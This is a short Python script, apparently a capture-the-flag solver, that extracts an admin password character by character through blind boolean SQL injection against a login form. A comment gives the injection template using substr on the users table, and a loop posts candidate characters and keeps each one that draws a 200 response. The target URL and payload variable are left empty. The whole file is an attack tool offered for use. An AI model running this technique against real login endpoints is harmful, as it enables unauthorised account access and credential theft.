import requests

s = requests.Session()
flag=""
char_array = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}._!@#$%^&*()-=+")
url=""

for i in range(0,59):
    for char in char_array:
        payload=""
        #ex -> payload = f'1" OR (SELECT substr(password,{i},1) from users where username="admin")="{char}'
        cred = {'username':'admin','password':payload}
        r = s.post(url,data=cred)
        if(r.status_code==200):
            flag+=char
            print(flag)
            break
